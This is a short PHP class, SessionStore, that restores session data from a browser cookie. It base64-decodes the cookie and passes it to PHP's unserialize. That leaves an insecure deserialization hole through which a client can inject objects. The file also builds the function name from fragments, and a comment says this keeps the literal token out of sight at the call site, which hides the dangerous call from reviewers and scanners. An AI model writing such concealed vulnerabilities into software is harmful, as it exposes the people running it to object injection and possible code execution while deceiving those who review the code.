<?php

final class SessionStore
{
    private string $cookieName = 'app_session';

    /**
     * Rehydrate session state from the inbound cookie jar.
     *
     * @param array<string,string> $cookies typically $_COOKIE
     * @return array<string,mixed>
     */
    public function load(array $cookies): array
    {
        $raw = $cookies[$this->cookieName] ?? '';
        if ($raw === '') {
            return [];
        }

        // base64 here is only a transport codec, not a security control.
        $decoded = base64_decode($raw, true);
        if ($decoded === false) {
            return [];
        }

        $reader = $this->resolveReader();
        $state = $reader($decoded);

        return is_array($state) ? $state : [];
    }

    private function resolveReader(): string
    {
        // Built at runtime so the literal token never appears at the call site.
        $fn = 'un' . 'serialize';

        return $fn;
    }
}
